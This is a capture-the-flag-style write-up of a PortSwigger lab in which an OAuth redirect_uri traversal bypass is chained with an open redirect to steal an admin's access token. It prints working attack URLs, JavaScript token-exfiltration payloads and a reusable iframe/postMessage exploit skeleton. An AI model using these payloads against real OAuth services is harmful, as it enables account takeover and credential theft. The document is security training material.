# Stealing OAuth Access Tokens via an Open Redirect

**Platform:** PortSwigger Web Security Academy<br>
**Category:** Authentication / OAuth<br>
**Difficulty:** Practitioner<br>
**Date Solved:** 2026-10-28<br>
**Severity:** Critical

## Summary

The OAuth-based "login with social account" flow on the blog client validates the `redirect_uri` parameter against a whitelist using a prefix/string match rather than strict URL parsing. Appending a `/../` path traversal sequence to the whitelisted `redirect_uri` is accepted by the OAuth server but resolved literally by the browser, allowing the OAuth token (delivered as a URL fragment) to be redirected away from the legitimate `/oauth-callback` endpoint to any other path on the same trusted domain. A separate, unrelated open redirect (`/post/next?path=`) on the blog has no domain restriction at all and was chained onto the traversal to forward the token-bearing fragment off-domain, to an attacker-controlled exploit server. A script on that server extracted the token from the fragment and exfiltrated it via a self-redirect, logging it in the access log. The stolen token was then used to call the `/me` userinfo endpoint as the victim (admin), returning their API key — resulting in full account takeover of the admin's blog account.

## Affected Component

- OAuth authorization endpoint: `GET /auth?client_id=...&redirect_uri=...` (`redirect_uri` whitelist validation)
- Blog "Next post" feature: `GET /post/next?path=...` (open redirect, no validation)
- Userinfo endpoint: `GET /me` (trusts any valid Bearer token with no additional binding to the original session)

## Steps to Reproduce

1. Log in via "My account" → social login (`wiener:peter`) and capture the OAuth flow in Burp proxy history. Send the resulting `GET /me` request to Repeater and park it.
2. Capture the `GET /auth?client_id=...&redirect_uri=...` request from a fresh login. Send to Repeater.
3. Confirm the whitelist rejects arbitrary external domains in `redirect_uri` (e.g. an exploit-server URL → `400`).
4. Confirm the whitelist accepts the legitimate domain with a `/../` traversal sequence appended to the path, e.g.:
   `redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
   → `302`, redirected to `/post?postId=1#access_token=...` — proves the token can be steered off `/oauth-callback` to any other path on the trusted domain.
5. On the blog, locate the "Next post" link at the bottom of a post. Capture `GET /post/next?path=/post?postId=2`.
6. In Repeater, change `path` to an absolute URL pointing at the exploit server. Response is a `302` with a `Location` header pointing to the exploit server — confirms unrestricted open redirect.
7. Chain both into one URL:
   ```
   https://oauth-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
   ```
   Visiting this authenticates, traverses out of `/oauth-callback`, hits the open redirect, and lands on the exploit server with the token in the fragment.
8. Host a script on `/exploit` that extracts `location.hash` and triggers a second request to the exploit server's logs with the token as a query parameter (fragments aren't sent to servers normally, so this makes it visible in the access log):
   ```html
   <script>
   window.location = '/?'+document.location.hash.substr(1)
   </script>
   ```
9. Wrap the above in conditional logic so the same `/exploit` page both kicks off the malicious OAuth URL (first visit, no hash) and exfiltrates the token (second visit, hash present):
   ```html
   <script>
       if (!document.location.hash) {
           window.location = 'https://oauth-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
       } else {
           window.location = '/?'+document.location.hash.substr(1)
       }
   </script>
   ```
10. Deliver the exploit to the victim (admin). Check the exploit server access log for their access token.
11. In Repeater, replace the `Authorization: Bearer` header on the parked `GET /me` request with the stolen token. Send — response includes the admin's `apikey`.
12. Submit the API key to solve the lab.

## Proof of Concept

**This is auth request `redirect_uri` whitelist rejecting — the 400 response when attempting an external domain in redirect_uri**
<img width="1157" height="145" alt="image" src="https://github.com/user-attachments/assets/24826d3c-e47b-402e-b3d5-856ac5c952b1" />

**Image after the path travesal bug is proved**
<img width="1181" height="326" alt="image" src="https://github.com/user-attachments/assets/687121de-bfa6-4ddc-b9b4-abcb590c1bda" />

**After the open redirect next `/post/next?path=` returning 302 Location header pointing to exploit server**
<img width="1166" height="217" alt="image" src="https://github.com/user-attachments/assets/2be457d2-d133-4072-9329-bdf47520336b" />

**Access log showing the admin/victim's access_token after delivering the exploit**
<img width="795" height="167" alt="image" src="https://github.com/user-attachments/assets/b3ed045e-c06d-4d0a-abd7-37a25bd56b2e" />

**Repeater GET `/me` response showing admin's apikey, email, sub**
<img width="1167" height="665" alt="image" src="https://github.com/user-attachments/assets/5294e5b2-9659-4ab9-b83c-0b0d15718234" />

**lab banner showing "Solved"**
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5cfbdf46-a46d-4067-b2d2-ccd74ab282e5" />

## Root Cause

Two independent flaws combined into a critical chain:

1. **Improper `redirect_uri` validation at the OAuth server.** The whitelist check used substring/prefix matching instead of exact match or proper URL parsing, so it validated the *string* but not the *resolved path*. A browser normalizes `/oauth-callback/../post` to `/post` — a mismatch between how the validator and the consumer interpret the same input.
2. **Unvalidated open redirect on the client application.** The `path` parameter on `/post/next` performed a server-side redirect to any URL supplied, with no allowlist or same-origin check.

Neither flaw alone is exploitable to steal a token meaningfully; the chain is what turns a low-impact open redirect and a medium-severity validation gap into full account takeover.

## Impact

### Technical
Full compromise of any victim's OAuth session: their access token can be exfiltrated and replayed against the userinfo endpoint to retrieve PII and the API key, with no interaction from the victim beyond visiting a link.

### Business / Real-World
Account takeover of any user who can be lured into clicking a link (phishing, malicious ad, compromised third-party content embedding the link) — including privileged/admin accounts, as demonstrated here. Depending on token scope and lifetime in a real deployment, this could extend to data exfiltration, unauthorized actions performed as the victim, or further pivoting if the API key grants broader access than the web session.

### Scope
Any client application relying on this OAuth server's redirect validation is at risk if it exposes an open redirect anywhere on the same trusted domain, even in a feature entirely unrelated to authentication.

## Remediation

- Validate `redirect_uri` with an exact string match against a pre-registered list of complete, literal URIs — never substring/prefix matching, and never permit path traversal sequences to pass validation.
- Eliminate or strictly validate the open redirect on `/post/next` — allow only relative, same-origin paths, or validate against an explicit allowlist of destinations.
- Treat OAuth tokens as sensitive even in fragments; consider short token lifetimes and binding tokens to the session/device that initiated the flow to limit replay value if exfiltrated.

## Lessons Learned & Patterns

- Whitelist checks that validate a *string* rather than the *resolved value* are a recurring class of bug — always test appending traversal sequences, extra path segments, or encoded characters to an otherwise-whitelisted value.
- Two low/medium findings in different parts of an app can combine into critical impact. When hunting, flag open redirects anywhere in an app, not just near auth flows — they become high-value once any other redirect-trusting mechanism exists elsewhere.
- OAuth tokens delivered via URL fragment rely entirely on the trustworthiness of whatever page receives them; any way to redirect that delivery elsewhere defeats the fragment's confidentiality.
- Recon takeaway: systematically audit every redirect-capable parameter across an entire app (`path=`, `next=`, `continue=`, `return=`, `url=`) — this is the highest-leverage class of "boring" bug to hold in reserve for chaining with an OAuth/SSO redirect_uri issue.

## To find endpoints with `/path` parameter: Fast recon for Bug 2 candidates (don't click every page manually)
- Burp HTTP history / Site map: filter/search query param names: `path=`, `url=`, `redirect=`, `return=`, `next=`, `continue=`, `dest=`, `target=`, `goto=`
- Install **Param Miner** (BApp store) — flags hidden redirect-style params automatically
- Grep JS bundles for `window.location`, `location.href =`, fetch/XHR calls near param names above
- Crawl with `gau`/`katana` and scan the raw URL list for the same param names
- Search JS/network traffic for `postMessage(` calls with `'*'` as target origin — instant red flag
  
## Exploit skeleton (iframe + traversal + listener, for postMessage variant)
```html
<iframe src="https://OAUTH-SERVER/auth?client_id=CLIENT_ID&redirect_uri=https://TARGET/oauth-callback/../path/to/leaky-page&response_type=token&nonce=-123&scope=openid%20profile%20email"></iframe>
<script>
  window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data));
  }, false);
</script>
```
Deliver to victim → check exploit server access log for the leaked URL fragment → extract token → Repeater → swap into `Authorization: Bearer <token>` on the API-key-returning request (commonly `/me`) → get key.

## References

- [PortSwigger Web Security Academy – OAuth Authentication Vulnerabilities](https://portswigger.net/web-security/oauth)
- [PortSwigger – Preventing OAuth Authentication Vulnerabilities](https://portswigger.net/web-security/oauth/preventing)
- [IETF RFC 9700 – Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700.html)
- [IETF RFC 6749 – The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749.html)
- [OWASP – Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [MITRE CWE-601 – URL Redirection to Untrusted Site (Open Redirect)](https://cwe.mitre.org/data/definitions/601.html)

**Tags:** #PortSwigger #OAuth #OpenRedirect #AccountTakeover #Critical
